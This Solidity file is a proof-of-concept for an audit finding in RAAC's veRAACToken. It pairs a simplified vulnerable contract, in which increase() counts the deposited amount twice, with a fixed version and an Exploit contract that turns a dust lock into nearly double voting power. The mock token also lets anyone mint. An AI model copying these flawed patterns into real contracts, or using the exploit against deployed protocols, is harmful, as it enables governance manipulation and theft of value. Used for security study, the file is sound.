// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC veRAACToken — Codehawks 2025-02
    increase() adds `amount` inside increaseLock, then adds `amount` again
    when it computes the new bias. A dust lock plus one increase mints almost
    2x the veToken and voting power of a single lock of the same RAAC.
*/

contract RaacToken {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VeToken {
    uint256 public constant MAX_LOCK_DURATION = 365 days;
    RaacToken public raac;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public lockedAmount;
    mapping(address => uint256) public votingPower;

    constructor(RaacToken raac_) {
        raac = raac_;
    }

    function lock(uint256 amount, uint256 duration) external {
        require(lockedAmount[msg.sender] == 0, "exists");
        require(duration == MAX_LOCK_DURATION, "duration");
        require(raac.transferFrom(msg.sender, address(this), amount), "pull");
        lockedAmount[msg.sender] = amount;
        uint256 power = amount * duration / MAX_LOCK_DURATION;
        balanceOf[msg.sender] = power;
        votingPower[msg.sender] = power;
    }

    function increase(uint256 amount) external {
        require(lockedAmount[msg.sender] != 0, "no lock");
        require(raac.transferFrom(msg.sender, address(this), amount), "pull");
        // Increase lock using LockManager. `amount` is already added.
        _increaseLock(msg.sender, amount);
        uint256 userAmount = lockedAmount[msg.sender];
        // @> VULN: userAmount already includes `amount`, and amount is added again
        uint256 counted = userAmount + amount;
        uint256 newPower = counted * MAX_LOCK_DURATION / MAX_LOCK_DURATION;
        balanceOf[msg.sender] = newPower;
        votingPower[msg.sender] = newPower;
    }

    function _increaseLock(address user, uint256 amount) internal {
        lockedAmount[user] += amount;
    }

    function getVotingPower(address user) external view returns (uint256) {
        return votingPower[user];
    }
}

contract VeTokenFixed {
    uint256 public constant MAX_LOCK_DURATION = 365 days;
    RaacToken public raac;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public lockedAmount;

    constructor(RaacToken raac_) {
        raac = raac_;
    }

    function lock(uint256 amount, uint256 duration) external {
        require(duration == MAX_LOCK_DURATION, "duration");
        require(raac.transferFrom(msg.sender, address(this), amount), "pull");
        lockedAmount[msg.sender] += amount;
        balanceOf[msg.sender] = lockedAmount[msg.sender];
    }

    function increase(uint256 amount) external {
        require(raac.transferFrom(msg.sender, address(this), amount), "pull");
        lockedAmount[msg.sender] += amount;
        balanceOf[msg.sender] = lockedAmount[msg.sender];
    }
}

contract Exploit {
    RaacToken public raac;
    VeToken public ve;
    uint256 public power;
    uint256 public minted;

    constructor() {
        raac = new RaacToken();
        ve = new VeToken(raac);
        raac.mint(address(this), 100 ether);
        raac.approve(address(ve), type(uint256).max);
    }

    function run() external {
        ve.lock(1, ve.MAX_LOCK_DURATION());
        ve.increase(100 ether - 1);
        power = ve.getVotingPower(address(this));
        minted = ve.balanceOf(address(this));
        require(power == 200 ether - 1, "power");
        require(minted == 200 ether - 1, "ve");
        require(power > 100 ether, "double");
    }
}
